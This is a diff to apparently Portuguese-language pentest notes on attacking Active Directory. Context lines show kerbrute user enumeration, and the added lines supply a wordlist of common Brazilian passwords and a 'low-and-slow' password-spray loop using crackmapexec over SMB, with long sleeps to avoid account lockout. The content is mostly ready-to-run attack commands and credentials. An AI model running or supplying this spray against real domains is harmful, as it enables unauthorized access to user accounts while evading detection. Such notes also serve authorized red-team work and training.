@@ -31,6 +31,47 @@ Smaug@erebor:~$ git clone https://github.com/ropnop/kerbrute; cd kerbrute
 Smaug@erebor:~$ go build .
 Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL wordlist_login_pt_br.txt
 ```
-  
+#### pass.txt:  
+```
+Mudar@123
+P@ssw0rd
+Pa55w.rd
+Microsoft.123
+Musc1234
+Brasil@2020
+Mudar123@
+Busca123
+Aval1234
+Auto1234
+Brasil@2019
+Mudar123*
+Bela@123
+Senha123@
+Mudar123
+Email@123
+Cambiar123@
+Brasil123@
+Mudar321@
+q1w2e3R$
+Brasil@1234
+abcd=1234
+Deus@123
+Brasil@123
+Brasil123
+Cambiar@123
+123qwe...
+Mudar1234!
+Jesus@123
+Jesus@10
+Senha231
+Maria@123
+Brasil@321
+Password@2022
+Brasil@1991
+```  
+## Ataque de LOW-AND-SLOW PasswordSpray:  
+```bash
+Smaug@erebor:~$ for p in $(cat pass.txt);do crackmapexec smb 192.168.0.10 -u valid_users.txt -p "$p" -d AD_NAME.LOCAL; sleep 400;done
+```
   
 :frog:  
